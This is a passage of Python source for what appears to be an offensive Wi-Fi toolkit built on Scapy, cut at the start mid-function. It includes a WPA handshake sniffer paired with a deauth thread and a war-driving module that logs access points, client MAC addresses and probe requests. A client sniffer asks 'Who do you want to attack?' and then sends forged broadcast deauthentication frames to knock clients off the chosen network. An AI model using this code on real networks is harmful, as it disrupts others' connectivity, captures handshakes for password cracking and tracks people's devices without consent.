                            time.sleep(0.1)

                            STAY = False       # BREAK NESTED LOOP
                            cls.SNIFF = False  # KILL BACKGROUND THREAD 
                        

                        except KeyboardInterrupt as e:
                            console.print("STOP PRESSING ctrl + c", style="bold red")
                            cls.SNIFF = False  # KILL BACKGROUND THREAD 

                

                # GENERAL ERRORS
                except Exception as e:
                    console.print(f"[bold red]Exception Error:[yellow] {e}")

                    time.sleep(3)
                    STAY = False
                    cls.SNIFF = False  # KILL BACKGROUND THREAD 

                    # CONFIRM UR STILL HERE
                    console.print("Still sniffing for hashes", style="bold green")

            

            # SNIFF END
            console.print("\n ---  SNIFF ENDED  --- ", style="bold red")

        

        def parser(pkt):
            """This will parse that hoe"""


            # ADDR1 == DST 
            # ADDR2 AND ADDR3 == SRC



            # ONLY EAPOL // HANDSHAKES
            if pkt.haslayer(EAPOL): 

                console.print(pkt)



                # GET ADDR1 & ADRR2
                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False

                sd = "Client" # DST FOR ADDR2 DST FOR SRC

                
                # GET SSID


                if addr1:

                    console.print(f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {sd} --> {addr1} --> {pkt}")

                

                if addr2:

                    console.print(f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {addr2} --> {sd}  --> {pkt}")




        # SNIFF FOR HASHES
        sniffer()
    


    @classmethod
    def main(cls):
        """This will run class wide logic"""



        # CLEAN VARS
        cls.ssids = []
        cls.mac_ifo = []
        cls.SNIFF = True


        # CATCH
        try:

            # GET IFACE
            cls.iface = Frame_Snatcher.get_interface()


            # WELCOME
            Frame_Snatcher.welcome_ui(iface=cls.iface)


            # START CHANNEL HOPPER
            Background_Threads.channel_hopper(verbose=False)


            # FIND APS
            Hash_Snatcher.sniff_for_ap(iface=cls.iface)


            # SMALL DEAUTH ON APS
            threading.Thread(target=Hash_Snatcher.target_attacker, args=(cls.iface, ), daemon=True).start()


            # SNIFF FOR HASHES
            Hash_Snatcher.sniff_for_hashes(iface=cls.iface, timeout=60*240)

            
            # END
            console.input("\n\n[bold green]Press Enter to Return: ")
        
        
        except KeyboardInterrupt as e:
            console.print(f"[bold red]Keyboard Error:[yellow] {e}")


        except Exception as e:
            console.print(f"[bold red]Exception Error:[yellow] {e}")


class War_Driving():
    """This class will be responsible for allowing the user to war drive"""


    mode = 0


    def __init__(self):
        pass

    

    @classmethod
    def data_assist(cls, iface):
        """This method will be responsible for updating panel values"""


        # COLORS
        c1 = "bold red"
        c2 = "bold green"
        c3 = "bold blue"
        c4 = "bold purple"


        # VARS
        d = 1


        
        # DEFINE PANEL
        panel = Panel(renderable=f"AP's Found: 0   -   Clients Found: 0   -   [bold green]Developed by NSM Barii",
                      style="bold yellow", border_style="bold red",
                      expand=False
                      )
        
        from rich.align import Align
        panel_allign = Align(panel, align="left", vertical="bottom")
        

        # CREATE LIVE ENV
        with Live(panel, console=console, refresh_per_second=1, screen=False):
           while cls.LIVE:

                try:     
                    if cls.LIVE:       


                        # UPDATE RENDERABLE
                        panel.renderable = (f"[{c1}]Channel:[/{c1}] {Background_Threads.channel}   -   [{c1}]AP's Found:[/{c1}] {len(cls.beacons)}   -   [{c1}]Clients Found:[/{c1}] {len(cls.macs)}   -   [bold green]Developed by NSM Barii")


                        # SMALL DELAY BECAUSE OF LOOP
                        time.sleep(1)


                        # USE THIS TO REMOVE APS FROM CLIENT LIST
                        for ap in cls.beacons:

                            if ap in cls.macs:
                                cls.macs.remove(ap)

                                # TELL USER
                                console.print(f"[bold yellow][-][/bold yellow] Removed AP from Client list --> {ap}", style="bold yellow")
                        

                        # USE THIS TO UPDATE JSON
                        if d == 5:
                            Recon_Pusher.push_war(save_data=cls.aps, CONSOLE=console)
                            d = 0

                        d += 1
                    
                    


                except KeyboardInterrupt as e:
                    #console.print("Now escaping the MATRIX", style="bold red")

                    # KILL BACKGROUND THREAD
                    cls.LIVE = False

                    break

                

                except Exception as e:
                    console.print(f"[bold red]Exception Error:[bold yellow] {e}")

                    # KILL BACKGROUND THREAD
                    cls.LIVE = False

                    break

   
    @classmethod
    def war_drive(cls, iface="wlan0", verbose=0):
        """This will begin the sniffing function"""


        # SET VARS
        attempts = 0


        # START BACKGROUND THREAD
        threading.Thread(target=War_Driving.data_assist, args=(iface, ), daemon=True).start()

        
        # LOOP FOF ERRORS
        while cls.LIVE:

            try:

                # APPEND
                attempts += 1

                console.print(f"Sniff Attempt #{attempts}", style="bold yellow")


                # SNIFF
                sniff(iface=iface, prn=War_Driving.packet_parser , store=0)


                # DELAY
                time.sleep(1)

                

            
            except KeyboardInterrupt as e:
                console.print(e)


                # KILL BACKGROUND THREAD
                cls.LIVE = False
              
                break

            

            # DESTROY ERRORS
            except Exception as e:
                console.print(f"[bold red]Exception Error:[bold yellow] {e}")


                # KILL BACKGROUND THREAD
                cls.LIVE = False


                # IN CASE OF LOOP ERRORS
                time.sleep(1)


    @classmethod
    def packet_parser(cls, pkt, verbose=True):
        """This method will parse packets"""


        def parser(pkt):

            
            # FOR AP's
            if pkt.haslayer(Dot11Beacon) and cls.mode == 1:


                # GET SSID
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"


                # GET ADDR
                addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else False

                

                # NONE AP //  ADDR1 == DST, ADDR2 == SRC
                if addr1 and addr1 not in cls.macs:


                    # APPEND TO LIST
                    cls.macs.append(addr1)


                    # GET SIGNAL
                    signal = NetTilities.get_rssi(pkt=pkt, format=True)


                    # GET VENDOR
                    vendor = Utilities.get_vendor(mac=addr2)  

                    # REVISE SSID
                    
                    signal = f"[bold red]Signal:[/bold red] {signal}"  


                    
                    # SET USE
                    if ssid:
                        use = f"{signal}  [bold red]Vendor:[bold yellow] {vendor}  [bold red]SSID:[/bold red] {ssid}"

                    elif vendor:
                        use = f"signal{signal}  [bold red]Vendor:[bold yellow] {vendor}"
                    
                    else:
                        use = f"{signal}"


                    # OUTPUT 
                    if verbose:
                        console.print(f"[bold cyan][+] Found AP?:[/bold cyan] {addr1}   {use}", style="bold yellow")


                
                # AP's ONLY 
                if addr2 and addr2 not in cls.beacons:

                    
                    # APPEND TO LIST
                    cls.beacons.append(addr2)


                    # GET IE's
                    #ssidd, channel, rsn, vendorr = NetTilities.get_ies(pkt=pkt, sort=True, ap=True)


                    # GET SIGNAL
                    signall = NetTilities.get_rssi(pkt=pkt, format=True)


                    # GET VENDOR
                    vendor = Utilities.get_vendor(mac=addr2)  

                    # REVISE SSID
                    
                    signal = f"[bold red]Signal:[/bold red] {signall}"  


                    
                    # SET USE
                    if ssid:
                        use = f"{signal}  [bold red]Vendor:[bold yellow] {vendor}  [bold red]SSID:[/bold red] {ssid}"

                    elif vendor:
                        use = f" {signal}  [bold red]Vendor:[bold yellow] {vendor}"
                    
                    else:
                        use = f"{signal}"


                    # OUTPUT 
                    if verbose:
                        console.print(f"[bold cyan][+] Found AP:[/bold cyan] {addr2}   {use}", style="bold yellow")


                        cls.aps[len(cls.aps)] = {
                            "ssid":ssid, 
                            "bssid": addr2, 
                            "vendor": vendor,
                            "encryption": "WPA2", 
                            "signal": signall,
                            "lat": 21,
                            "long": 34
                        }



            
            # FOR CLIENTS AND NON BEACON FRAMES
            elif pkt.haslayer(Dot11) and cls.mode==2:


                # GET ADDR
                addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else False
                

                

                # NONE AP //  ADDR1 == DST, ADDR2 == SRC
                if addr1 and addr1 not in cls.macs and addr1 not in cls.beacons:


                    # APPEND TO LIST
                    cls.macs.append(addr1)
                    
                    

                    # GET SIGNAL
                    signal = NetTilities.get_rssi(pkt=pkt, format=True)


                    # GET VENDOR
                    vendor = Utilities.get_vendor(mac=addr2)  
                    

                    signal = f"[bold red]Signal:[/bold red] {signal}"  


                    
                    # SET USE
                    if vendor:
                        use = f"[bold red]Vendor:[bold yellow] {vendor}  {signal}"


                    else:
                        use = f"{signal}"


                    # OUTPUT 
                    if verbose:
                        console.print(f"[bold red][+] Found Mac Addr:[bold yellow] {addr1}   {use}", style="bold yellow")


                
                # NONE AP //  ADDR1 == DST, ADDR2 == SRC
                if addr2 and addr2 not in cls.macs and addr2 not in cls.beacons:

                    
                    # APPEND TO LIST
                    cls.macs.append(addr2)



                    # GET SIGNAL
                    signal = NetTilities.get_rssi(pkt=pkt, format=True)


                    # GET VENDOR
                    vendor = Utilities.get_vendor(mac=addr2)  


                    # REVISE SSID
                    signal = f"[bold red]Signal:[/bold red] {signal}"  


                    
                    # SET USE
                    if vendor:
                        use = f"[bold red]Vendor:[bold yellow] {vendor}  {signal}"
                    
                    else:
                        use = f"{signal}"


                    # OUTPUT 
                    if verbose:
                        console.print(f"[bold red][+] Found Mac Addr:[bold yellow] {addr2}   {use}", style="bold yellow")

            

            # FOR CLIENT TRACKING
            War_Driving.track_clients(pkt)


        # THREAD IT SO THAT WAY MAIN THREAD CAN GET BACK TO WORK
        threading.Thread(target=parser, args=(pkt, ), daemon=True).start()
     
    
    @classmethod
    def track_clients(cls, pkt):
        """This method will be responsible for tracking clinets that are in the client list"""


        # COLORS
        c1 = "bold red"
        c2 = "bold green"
        c3 = "bold purple"
        c4 = "bold yellow"
        c5 = "bold cyan"


        # INFO
        # ADDR1 == DST, ADDR2 == SRC


        if pkt.haslayer(Dot11ProbeReq):


            # SET ADDR1
            addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else False
            addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else False

            
            # SNAG SSID
            ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else False
 
            
            # IF NOT SNAGGED ALREADY
            if addr2 and ssid:


                # MAKE
                if addr2 not in cls.probes:
                    cls.probes[addr2] = []
                    console.print(f"make --> {addr2}")



                # GET VENDOR
                vendor = Utilities.get_vendor(mac=addr2)


                # FOR SOURCE DESTINATION
                sd = f"[{c4}]{addr2}   [{c1}]Vendor:[/{c1}] {vendor}[/{c4}]  -->  [{c3}]{ssid}"


                
                # CHECK IF WE ALREADY SNAGGED THE SSID
                if ssid not in cls.probes[addr2]:


                    # PREVENT RACE ERRORS
                    with LOCK:

                        # OUTPUT RESULTS TO UI
                        console.print(f"[{c2}][+] Probe Detected:[/{c2}] {sd}")


                        # APPEND TO LIST 
                        cls.probes[addr2].append(ssid)

                



            # FOR CLIENTS PROBING OR TALKING TO AP
            use =  False
            if use:
                if addr2 and addr2 in cls.macs:


                    # MAKE
                    if addr2 not in cls.probes:
                        cls.probes[addr2] = []
                        console.print(f"make --> {addr2}")

                    
                    # GET VENDOR
                    vendor = Utilities.get_vendor(mac=addr2)


                    # GET SSID IF AVAILABLE
                    try:
                        ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else False
                    except Exception:
                        ssid = False


                    sd = f"[{c4}]{addr2}   [{c1}]Vendor:[/{c1}] {vendor}  -->  {ssid}"

                    
                    # FILTER NON PROBES
                    if ssid:


                        # MAKE KEY 
                        if addr2 not in cls.probes:
                            cls.probes[addr2] = []
                            console.print(f"make --> {addr2}")


                        # CHECK
                        if ssid not in cls.probes[addr2]:


                            # APPEND VALUE
                            cls.probes[addr2].append(ssid)
                            

                            # OUTPUT RESULTS TO UI
                            console.print(f"[{c2}][+] Probe Detected:[/{c2}] {sd}")
            

        # TEST
        if len(cls.macs) == 40:
            console.print(cls.probes)


    @classmethod
    def main(cls, mode=1):
        """This will be in charge of running class wide logic"""


        # SET VARS
        cls.probes = {}
        cls.macs = []
        cls.beacons = []
        cls.LIVE = True
        cls.mode = mode


        # WAR DRIVER
        cls.aps = {}

 
        try:

            # GET IFACE
            iface = Frame_Snatcher.get_interface()


            # WELCOME UI
            Frame_Snatcher.welcome_ui(iface=iface, text="    War \nDriving", c2="bold blue")


            # INIT WAR
            Recon_Pusher.main()


            # START CHANNEL HOPPER
            Background_Threads.channel_hopper(verbose=False)
            
            
            
            # START WAR DRIVING
            War_Driving.war_drive(iface=iface)
            #threading.Thread(target=War_Driving.war_drive, args=(iface, ), daemon=True).start()
            #War_Driving.data_assist(iface=iface)

            

            # NOW FOR THE EXIT
            time.sleep(.2)
            console.input("\n\n[bold red]Press enter to return: ")
        

        except KeyboardInterrupt as e:

            console.print(e)


        except Exception as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")


        

# THIS CLASS WILL BE A STANDALONE VERSION FOR TESTING OF NON-CONNECTED WIFI CLIENT SNIFFING.
class Client_Sniffer():
    """This class will be responsible for sniffing clients on targeted network"""



    @classmethod
    def sniff_for_targets(cls, iface):
        """This module will be responsible for sniffing for targets"""

        count = 1

        try:

            while True:


                console.print(f"[bold yellow]Sniff Attempt[bold yellow] [bold green]#{count}")

                sniff(iface=iface, prn=Client_Sniffer.packet_parser, store=0, timeout=15)


                if len(cls.ssids) > 0:


                    sniff(iface=iface, prn=Client_Sniffer.packet_parser, store=0, count=0, timeout=7)


                    break

                
                count += 1
        


        except Exception as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")

            input("hii")


            from nsm_ui import MainUI
            MainUI.main()
    

    @classmethod
    def packet_parser(cls, pkt, target=False, verbose=False):
        """This will break down and discet packets"""


        def parser(pkt):
            
            if pkt.haslayer(Dot11Beacon) and cls.type == 1:


                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else False
                
                addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else False

                

                if addr2 and ssid and addr2 not in cls.macs:

                    cls.macs.append(addr2)


                    channel = Background_Threads.get_channel(pkt=pkt)
                    vendor = Utilities.get_vendor(mac=addr2)
                    rssi = NetTilities.get_rssi(pkt=pkt)
                    encryption = Background_Threads.get_encryption(pkt=pkt)
                    freq = Background_Threads.get_freq(freq=pkt[RadioTap].ChannelFrequency)



            
        
                    cls.infos.append((ssid, addr2, vendor, encryption, freq, channel, rssi))
                    cls.ssids[addr2] = channel

                    console.print(f"[bold red]Snatched your SSID:[bold yellow] {ssid}")


                    

                   # if cls.ssids[addr2] == None: 

                        #cls.infos.remove((ssid, addr2, vendor, channel, rssi))
                        #cls.infos.pop()
                       # cls.macs.remove(addr2)

                    



            elif pkt.haslayer(Dot11) and cls.type == 2:


                addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 else False
                addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 else False

     
                 
                if addr2 == cls.target or addr1 == target:



                    console.print(f"Client: {addr2}  -->  {addr1}")

                    
                    if addr2 not in cls.clients:
                        
                        cls.clients.append(addr2 if addr2 else addr1)
                    
                    

      
      
        if cls.SNIFF:
            threading.Thread(target=parser, args=(pkt, ), daemon=True).start()

    
    @classmethod
    def target_chooser(cls, verbose=False):
        """This method will be used to choose from the target list"""


        num = 1
        data = {}
        error = False
        time.sleep(2)


        table = Table(title="Choose Bitch", border_style="bold red", style="bold purple", title_style="bold purple", header_style="bold purple")
        table.add_column("Key")
        table.add_column("SSID", style="bold blue")
        table.add_column("BSSID", style="bold green")
        table.add_column("Vendor", style="yellow")
        table.add_column("Encryption")
        table.add_column("Frequency")
        table.add_column("Channel")
        table.add_column("Rssi", style="bold red")



        for var in cls.infos:


            ssid = var[0]
            bssid = var[1]
            vendor = var[2]
            encryption = "WPA2"
            freq = var[4]
            channel = var[5]
            rssi = var[6]

            # ADD TO DICT
            data[num] = (var[0], var[1])


            table.add_row(f"{num}", f"{ssid}", f"{bssid}", f"{vendor}", f"{encryption}", f"{freq}", f"{channel}", f"{rssi}")
            num += 1

        


        
        print('\n\n'); console.print(table); print('\n')

        
        # DESTROY ERRORS
        while True:
            try:
                
                
                # FOR CLEANER OUTPUT
                if error:
                    console.print(f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!")
                    error = False 


                # USER CHOOSES THERE TARGET
                choice = console.input(f"[bold red]Who do you want to attack?: ").strip()

                # INT IT 
                choice = int(choice)



                if choice in range(1, num) or choice == num:
                    ssid = data[choice][0]
                    target = data[choice][1]
                    channel = cls.ssids[target]


                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")

                    
                    # RETURN THE TARGET
                    return ssid, target, channel
                
                

                # OUTSIDE OF NUM
                else:
                    error = True
                    
            
            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except KeyError as e:
                
                if verbose:
                    console.print(e)


                error = True

            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except TypeError as e:

                if verbose:
                    console.print(e)


                error = True
            

        
            
            # ELSE
            except Exception as e:

                if verbose:

                    console.print(f"[bold red]Exception Error:[yellow] {e}")

                
                if error == False:
                    error = 1
                
                elif error:
                    error += 1
                

                # SAFETY CATCH
                if error == 4:

                    console.print("Alright ur done for", style="bold red")
                    break
    

    @classmethod
    def sniff_the_target(cls, iface, ssid, target, channel):
        """This will sniff only from target"""


        cls.type = 2
        cls.target = target


        # SET CHANNEL
        Background_Threads.channel_hopper(set_channel=channel)

        
        # VARS
        clients = []
        clients_info = []
        verbose = True


        # CREATE TABLE
        table = Table(title=f"{ssid} - Client List", title_style="bold red", style="bold purple", border_style="purple", header_style="bold red")
        table.add_column("#")
        table.add_column("MAC Addr", style="bold blue")
        table.add_column("-->", style="bold red")
        table.add_column("AP", style="bold green")
        table.add_column("Vendor", style="bold yellow")


        
        # SNIFF FOR CLIENTS FIRST
        def small_deauth():
            """Send a deauth packet and sniff the reconnected macs"""

            sent = 0


            # DELAY WAIT FOR SNIFF
            time.sleep(3)


            # FUNCTION
            while sent < 10:

                # RANDOMIZE THE DEAUTH
                reasons = random.choice([4,5,7,15])
                
                # CRAFT THE FRAME
                frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
                

                # SEND THE FRAME
                #while True:
                sendp(frame, iface=iface, count=15, realtime=False,verbose=False)
       

                # WAIT
                time.sleep(1)


                # GO
                sent += 1

                if verbose:
                    console.print(f"Deauth --> {target}  -  Reason: {reasons}", style="bold red")


        def client_sniffer(pkt):
            """This will sniff client macs connected to the target"""

            
            # CATCH
            try:

                # FILTER FOR DOT11 FRAMES
                if pkt.haslayer(Dot11):

                    
                    # COLLECT ADDR1 & ADDR2
                    addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                    addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False

                    

                    # CHECK FOR TARGET
                    if addr1 == target or addr2 == target:

                        

                        # ADDR1
                        if addr1 != target and addr1 not in clients and addr1:


                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr1)
                            
                            # APPEND TO LIST
                            clients.append(addr1)

                            # FOR INFO
                            clients_info.append((addr2, vendor))


                            # ADD DATA TO TABLE
                            table.add_row(f"{len(clients)}", f"{addr1}", " --> ", f"{target}", f"{vendor}")

                        
                        
                        # ADDR2
                        elif addr2 != target and addr2 not in clients and addr2:


                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr2)

                            
                            # APPEND TO LIST
                            clients.append(addr2)

                            # FOR INFO
                            clients_info.append((addr2, vendor))


                            # ADD DATA TO TABLE
                            table.add_row(f"{len(clients)}", f"{addr2}", " --> ", f"{target}", f"{vendor}")



            # BREAK
            except KeyboardInterrupt as e:
                console.print(f"[bold red]YOU ESCAPED THE MATRIX:[yellow] {e}")                
            
            
            # ERROR
            except Exception as e:
                console.print(f"[bold red]Exception Error:[yellow] {e}")


        

        try:

            # START A BACKGROUND THREAD
            threading.Thread(target=small_deauth, daemon=True).start()


            console.print(f"\nI will now begin to sniff for clients for the next 'infinite' seconds if you want to stop earlier press [bold green]ctrl + c!\n", style="bold red")
            time.sleep(2)

            # SNIFF
            with Live(table, console=console, refresh_per_second=2):
                sniff(iface=iface, prn=client_sniffer, store=0, count=0)


                time.sleep(1.1)
        


        except KeyboardInterrupt as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")

            time.sleep(1)
            console.input("\n[bold red]Press Enter to EXIT: ")
        

        except Exception as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")


    @classmethod
    def main(cls):
        """This is where main logic will be launched from"""


        # SET VARS
        cls.infos = []
        cls.ssids = {}
        cls.macs = []
        cls.clients = []
        cls.type = 1
        cls.SNIFF = True
        Background_Threads.hop = True



        # GET IFACE
        try:


            iface = Frame_Snatcher.get_interface()


            # WELCOME UI
            Frame_Snatcher.welcome_ui(iface=iface, text="    Client \n  Sniffer", c2="bold green")


            # START CHANNEL HOPPER
            Background_Threads.channel_hopper(verbose=False)


            # SNIFF FOR TARGET
            Client_Sniffer.sniff_for_targets(iface=iface)


            # SELECT TARGET
            ssid, target, channel = Client_Sniffer.target_chooser()

            
            # GET TO SNIFFFING
            Client_Sniffer.sniff_the_target(iface=iface, ssid=ssid, target=target, channel=channel)
        


        except KeyboardInterrupt as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")


            cls.SNIFF = False
        

        except Exception as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")


            cls.SNIFF = False

            time.sleep(3)




# THIS CLASS IS STRICTLY TO BE USED AS A VICTIM NODE TO TEST IF THIS MODULE IS FUNCTIONAL 
class You_Cant_DOS_ME():
    """This is testing ground for weather or not i can withstand a ddos attack"""


    def __init__(self):
        pass


    @classmethod
    def ping(cls, host="google.com", timeout=4, verbose=False):
        """Create the ping packet and send it out"""


        # PRINT WELCOME
        text = pyfiglet.figlet_format(text="DOS\n ME", font="bloody")
        console.print(text, style="bold red")

        console.input("\n[bold red]ARE U READY ?: ")
        
        online = True
        pings = 0

        # TALK SHII FOR FUN
        talks = [
            "You can't hit me offline — I host the cloud.",
            "Yawn... I'm still online.",
            "Your net too slow to even scan me.",
            "My packets run laps around yours.",
            "Bro I deauth for fun.",
            "Your IP is giving home router energy.",
            "My Wi-Fi's got better uptime than your excuses.",
            "I don't lag — I throttle reality.",
            "My ping is lower than your standards.",
            "Try harder... I'm behind 3 VPNs and your girl’s Wi-Fi.",
            "You scan ports, I open wormholes.",
            "Your whole setup runs on hope and Starbucks Wi-Fi.",
            "Deauth me? I deauth back with feelings.",
            "Nice packet — shame it never reached me.",
            "You can’t trace me — I lost myself years ago."
        ]

        
        while True:
            try:
                
                # CREATE PACKET AND GET HOST
                ip = socket.gethostbyname(str(host))
                console.print(ip)
                ping = IP(dst=ip) / ICMP()

                
                # ERROR CHECK
                console.print(ping)
                time.sleep(3)

                break


            # CTRL + C
            except KeyboardInterrupt as e:
                console.print(e)

                return
            
            except Exception as e:
                console.print(f"[bold red]Socket Exception Error: {e}")
                time.sleep(3)
                return
            
            
        # LOOP THAT BITCH
        while online:

            try:
            
                # TRACK PING TIME
                time_start = time.time()
                response = sr1(ping, timeout=timeout, verbose=verbose)

                time_took = time.time() - time_start

                
                if response:
                    console.print(f"[bold blue]Connection Status: [bold green]Online  -  Latency: {time_took:.2f}")
                

                else:
                    console.print(f"[bold blue]Connection Status: [bold red]Offline  -  I HATE YOU")



                    
                pings += 1 
                if time_took < 1.0:
                    time.sleep(1.5)


                ran = random.randint(0,10)

                if ran == 4:

                    console.print(talks[random.randint(0,14)])
            


            
            # CTRL + C
            except KeyboardInterrupt as e:
                console.print("\n",e)
                
                console.input("[bold yellow]Press Enter to leave: ")
                console.print("\nReturning to Main Menu", style="bold green")
                time.sleep(2)

                break
        

            except Exception as e:

                # SET ONLINE TO FALSE
                console.print(f"[bold red]Exception Error: {e}")




# FOR MODULE TESTING
if __name__ == "__main__":
    
    
    from scapy.all import Ether, ARP, IP, srp
    


    sub = console.input("Enter subnet: ")

    subnet = ipaddress.ip_network(sub)


    arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(subnet))

    response = srp(arp, timeout=3)[0]


    for sent, recv in response:
        
        ip = recv.psrc
        mac = recv.hwsrc


        if ip:
            console.print(f"IP: {ip} --> MAC: {mac}", style="bold green")
        